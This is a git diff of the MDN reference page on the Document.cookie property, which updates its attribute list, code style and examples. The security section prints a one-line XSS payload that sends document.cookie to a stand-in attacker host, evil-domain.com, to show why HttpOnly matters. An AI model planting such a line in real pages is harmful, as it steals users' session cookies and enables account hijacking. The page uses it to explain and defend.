@@ -1,17 +1,11 @@
 ---
-title: Document.cookie
+title: "Document: cookie property"
+short-title: cookie
 slug: Web/API/Document/cookie
-tags:
-  - API
-  - Document
-  - HTML DOM
-  - JS
-  - NeedsMarkupWork
-  - Reference
-  - Storage
-  - cookie
+page-type: web-api-instance-property
 browser-compat: api.Document.cookie
 ---
+
 {{APIRef("DOM")}}
 
 The {{domxref("Document")}} property `cookie` lets
@@ -40,38 +34,19 @@ not abide by this.
 document.cookie = newCookie;
 ```
 
-In the code above, `newCookie` is a string of form
-`key=value`. Note that you can only set/update a
-single cookie at a time using this method. Consider also that:
+In the code above, `newCookie` is a string of form `key=value`, specifying the cookie to set/update. Note that you can only set/update a single cookie at a time using this method. Consider also that:
 
 - Any of the following cookie attribute values can optionally follow the key-value
-  pair, specifying the cookie to set/update, and preceded by a semi-colon separator:
-
-  - `;path=path` (e.g., '`/`',
-    '`/mydir`') If not specified, defaults to the current path
-    of the current document location.
-
-    > **Note:** Prior to {{Gecko("6.0")}}, paths
-    > with quotes were treated as if the quotes were part of the string,
-    > instead of as if they were delimiters surrounding the actual path
-    > string. This has been fixed.
+  pair, each preceded by a semicolon separator:
 
   - `;domain=domain` (e.g.,
-    '`example.com`' or '`subdomain.example.com`'). If
-    not specified, this defaults to the host portion of the current document
-    location. Contrary to earlier specifications, leading dots in domain names
-    are ignored, but browsers may decline to set the cookie containing such
-    dots. If a domain is specified, subdomains are always included.
+    '`example.com`' or '`subdomain.example.com`'): The host to which the cookie will be sent. If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.
 
     > **Note:** The domain _must_ match
     > the domain of the JavaScript origin. Setting cookies to foreign
     > domains will be silently ignored.
 
-  - `;max-age=max-age-in-seconds` (e.g.,
-    `60*60*24*365` or 31536000 for a year)
-  - `;expires=date-in-GMTString-format` If neither
-    `expires` nor `max-age` specified it will expire at
-    the end of session.
+  - `;expires=date-in-GMTString-format`: The expiry date of the cookie. If neither `expires` nor `max-age` is specified, it will expire at the end of session.
 
     > **Warning:** When user privacy is a concern, it's important that any web app
     > implementation invalidate cookie data after a certain timeout
@@ -79,18 +54,21 @@ single cookie at a time using this method. Consider also that:
     > users specify that cookies should never expire, which is not
     > necessarily safe.
 
-    - See {{jsxref("Date.toUTCString()")}} for help formatting this
-      value.
+    See {{jsxref("Date.toUTCString()")}} for help formatting this
+    value.
 
-  - `;secure` Cookie to only be transmitted
-    over secure protocol as https. Before Chrome 52, this flag could appear
-    with cookies from http domains.
-  - `;samesite` [SameSite](/en-US/docs/Web/HTTP/Cookies#samesite_cookies)
-    prevents the browser from sending this cookie along with cross-site
-    requests. Possible values are `lax`,
-    `strict` or `none`.
+  - `;max-age=max-age-in-seconds`: The maximum age of the cookie in seconds (e.g.,
+    `60*60*24*365` or 31536000 for a year).
 
-    - The `lax` value will send the cookie for all same-site
+  - `;partitioned`: Indicates that the cookie should be stored using partitioned storage. See [Cookies Having Independent Partitioned State (CHIPS)](/en-US/docs/Web/Privacy/Partitioned_cookies) for more details.
+
+  - `;path=path`: Indicates the path that must exist in the requested URL for the browser to send the {{httpheader("Cookie")}} header (e.g., '`/`',
+    '`/mydir`'). If not specified, it defaults to the current path of the current document location.
+
+  - `;samesite`: [SameSite](/en-US/docs/Web/HTTP/Cookies#samesite_cookies) prevents the browser from sending this cookie along with cross-site
+    requests. Possible values are `lax`, `strict` or `none`.
+
+    - The `lax` value will send the cookie for all same-site
       requests and top-level navigation GET requests. This is sufficient
       for user tracking, but it will prevent many [Cross-Site Request Forgery](/en-US/docs/Glossary/CSRF) (CSRF) attacks. This is
       the default value in modern browsers.
@@ -101,8 +79,10 @@ single cookie at a time using this method. Consider also that:
       be applied. The cookie will be sent in all requests—both
       cross-site and same-site.
 
+  - `;secure`: Specifies that the cookie should only be transmitted over a secure protocol.
+
 - The cookie value string can use {{jsxref("Global_Objects/encodeURIComponent",
-		"encodeURIComponent()")}} to ensure that the string does not contain any commas,
+  "encodeURIComponent()")}} to ensure that the string does not contain any commas,
   semicolons, or whitespace (which are disallowed in cookie values).
 - Some user agent implementations support the following cookie prefixes:
 
@@ -125,7 +105,7 @@ single cookie at a time using this method. Consider also that:
 
 ## Examples
 
-### Example #1: Simple usage
+### Example 1: Simple usage
 
 ```js
 // Note that we are setting `SameSite=None;` in this example because the example
@@ -136,22 +116,20 @@ document.cookie = "name=oeschger; SameSite=None; Secure";
 document.cookie = "favorite_food=tripe; SameSite=None; Secure";
 
 function showCookies() {
-  const output = document.getElementById('cookies')
-  output.textContent = '> ' + document.cookie
+  const output = document.getElementById("cookies");
+  output.textContent = `> ${document.cookie}`;
 }
 
 function clearOutputCookies() {
-  const output = document.getElementById('cookies')
-  output.textContent = ''
+  const output = document.getElementById("cookies");
+  output.textContent = "";
 }
 ```
 
 ```html
 <button onclick="showCookies()">Show cookies</button>
 
-<button onclick="clearOutputCookies()">
-  Clear
-</button>
+<button onclick="clearOutputCookies()">Clear</button>
 
 <div>
   <code id="cookies"></code>
@@ -160,7 +138,7 @@ function clearOutputCookies() {
 
 {{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}
 
-### Example #2: Get a sample cookie named _test2_
+### Example 2: Get a sample cookie named test2
 
 ```js
 // Note that we are setting `SameSite=None;` in this example because the example
@@ -171,27 +149,25 @@ document.cookie = "test1=Hello; SameSite=None; Secure";
 document.cookie = "test2=World; SameSite=None; Secure";
 
 const cookieValue = document.cookie
-  .split('; ')
-  .find(row => row.startsWith('test2='))
-  .split('=')[1];
+  .split("; ")
+  .find((row) => row.startsWith("test2="))
+  ?.split("=")[1];
 
 function showCookieValue() {
-  const output = document.getElementById('cookie-value')
-  output.textContent = '> ' + cookieValue
+  const output = document.getElementById("cookie-value");
+  output.textContent = `> ${cookieValue}`;
 }
 
 function clearOutputCookieValue() {
-  const output = document.getElementById('cookie-value')
-  output.textContent = ''
+  const output = document.getElementById("cookie-value");
+  output.textContent = "";
 }
 ```
 
 ```html
 <button onclick="showCookieValue()">Show cookie value</button>
 
-<button onclick="clearOutputCookieValue()">
-  Clear
-</button>
+<button onclick="clearOutputCookieValue()">Clear</button>
 
 <div>
   <code id="cookie-value"></code>
@@ -200,37 +176,40 @@ function clearOutputCookieValue() {
 
 {{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}
 
-### Example #3: Do something only once
+### Example 3: Do something only once
 
 In order to use the following code, please replace all occurrences of the word
 `doSomethingOnlyOnce` (the name of the cookie) with a custom name.
 
 ```js
 function doOnce() {
-  if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) {
+  if (
+    !document.cookie
+      .split("; ")
+      .find((row) => row.startsWith("doSomethingOnlyOnce"))
+  ) {
     // Note that we are setting `SameSite=None;` in this example because the example
     // needs to work cross-origin.
     // It is more common not to set the `SameSite` attribute, which results in the default,
     // and more secure, value of `SameSite=Lax;`
-    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
+    document.cookie =
+      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
 
-    const output = document.getElementById('do-once')
-    output.textContent = '> Do something here!'
+    const output = document.getElementById("do-once");
+    output.textContent = "> Do something here!";
   }
 }
 
 function clearOutputDoOnce() {
-  const output = document.getElementById('do-once')
-  output.textContent = ''
+  const output = document.getElementById("do-once");
+  output.textContent = "";
 }
 ```
 
 ```html
 <button onclick="doOnce()">Only do something once</button>
 
-<button onclick="clearOutputDoOnce()">
-  Clear
-</button>
+<button onclick="clearOutputDoOnce()">Clear</button>
 
 <div>
   <code id="do-once"></code>
@@ -239,7 +218,7 @@ function clearOutputDoOnce() {
 
 {{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}
 
-### Example #4: Reset the previous cookie
+### Example 4: Reset the previous cookie
 
 ```js
 function resetOnce() {
@@ -247,24 +226,23 @@ function resetOnce() {
   // needs to work cross-origin.
   // It is more common not to set the `SameSite` attribute, which results in the default,
   // and more secure, value of `SameSite=Lax;`
-  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";
+  document.cookie =
+    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";
 
-  const output = document.getElementById('reset-once')
-  output.textContent = '> Reset!'
+  const output = document.getElementById("reset-once");
+  output.textContent = "> Reset!";
 }
 
 function clearOutputResetOnce() {
-  const output = document.getElementById('reset-once')
-  output.textContent = ''
+  const output = document.getElementById("reset-once");
+  output.textContent = "";
 }
 ```
 
 ```html
 <button onclick="resetOnce()">Reset only once cookie</button>
 
-<button onclick="clearOutputResetOnce()">
-  Clear
-</button>
+<button onclick="clearOutputResetOnce()">Clear</button>
 
 <div>
   <code id="reset-once"></code>
@@ -273,7 +251,7 @@ function clearOutputResetOnce() {
 
 {{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}
 
-### Example #5: Check a cookie existence
+### Example 5: Check a cookie existence
 
 ```js
 // Note that we are setting `SameSite=None;` in this example because the example
@@ -283,26 +261,24 @@ function clearOutputResetOnce() {
 document.cookie = "reader=1; SameSite=None; Secure";
 
 function checkACookieExists() {
-  if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))) {
-    const output = document.getElementById('a-cookie-existence')
-    output.textContent = '> The cookie "reader" exists'
+  if (
+    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
+  ) {
+    const output = document.getElementById("a-cookie-existence");
+    output.textContent = '> The cookie "reader" exists';
   }
 }
 
 function clearOutputACookieExists() {
-  const output = document.getElementById('a-cookie-existence')
-  output.textContent = ''
+  const output = document.getElementById("a-cookie-existence");
+  output.textContent = "";
 }
 ```
 
 ```html
-<button onclick="checkACookieExists()">
-  Check a cookie exists
-</button>
+<button onclick="checkACookieExists()">Check a cookie exists</button>
 
-<button onclick="clearOutputACookieExists()">
-  Clear
-</button>
+<button onclick="clearOutputACookieExists()">Clear</button>
 
 <div>
   <code id="a-cookie-existence"></code>
@@ -311,19 +287,19 @@ function clearOutputACookieExists() {
 
 {{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}
 
-### Example #6: Check that a cookie has a specific value
+### Example 6: Check that a cookie has a specific value
 
 ```js
 function checkCookieHasASpecificValue() {
-  if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
-    const output = document.getElementById('a-specific-value-of-the-cookie')
-    output.textContent = '> The cookie "reader" has a value of "1"'
+  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+    const output = document.getElementById("a-specific-value-of-the-cookie");
+    output.textContent = '> The cookie "reader" has a value of "1"';
   }
 }
 
 function clearASpecificValueOfTheCookie() {
-  const output = document.getElementById('a-specific-value-of-the-cookie')
-  output.textContent = ''
+  const output = document.getElementById("a-specific-value-of-the-cookie");
+  output.textContent = "";
 }
 ```
 
@@ -332,9 +308,7 @@ function clearASpecificValueOfTheCookie() {
   Check that a cookie has a specific value
 </button>
 
-<button onclick="clearASpecificValueOfTheCookie()">
-  Clear
-</button>
+<button onclick="clearASpecificValueOfTheCookie()">Clear</button>
 
 <div>
   <code id="a-specific-value-of-the-cookie"></code>
@@ -354,16 +328,14 @@ using a different domain or subdomain, due to the [same origin policy](/en-US/do
 
 Cookies are often used in web applications to identify a user and their authenticated
 session. Stealing a cookie from a web application leads to hijacking the
-authenticated user's session. Common ways to steal cookies include using [social
-engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
+authenticated user's session. Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
 The `HTTPOnly` cookie attribute can help to mitigate this attack by
-preventing access to cookie value through Javascript. Read more about [Cookies and
-Security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/).
+preventing access to cookie value through JavaScript. Read more about [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
 
 ## Notes
 
@@ -385,7 +357,7 @@ The reason for the [syntax](#syntax) of the `document.cookie`
 accessor property is due to the client-server nature of cookies, which differs from
 other client-client storage methods (like, for instance, [localStorage](/en-US/docs/Web/API/Web_Storage_API)):
 
-#### The server tells the client to store a cookie
+### The server tells the client to store a cookie
 
 ```bash
 HTTP/1.0 200 OK
@@ -396,7 +368,7 @@ Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
 [content of the page here]
 ```
 
-#### The client sends back to the server its cookies previously stored
+### The client sends back to the server its cookies previously stored
 
 ```bash
 GET /sample_page.html HTTP/1.1
